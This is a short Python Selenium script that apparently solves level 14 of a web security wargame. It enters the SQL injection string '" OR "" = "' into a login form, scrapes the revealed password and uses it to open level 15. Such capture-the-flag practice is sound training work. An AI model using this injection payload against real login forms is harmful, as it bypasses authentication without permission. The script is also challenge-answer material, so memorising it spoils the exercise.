from common import *

def solve(driver, _ = None):
    driver.get(build_url(level=14))
    
    driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys("blub")
    driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').send_keys('" OR "" = "')
    driver.find_element(By.XPATH, '//*[@id="content"]/form/input[3]').click()
    
    text = driver.find_element(By.XPATH, '//*[@id="content"]').text
    password = text[text.find("is ")+3:text.find('\n')]
    
    driver.get(build_url(password = password, level=15))
    return password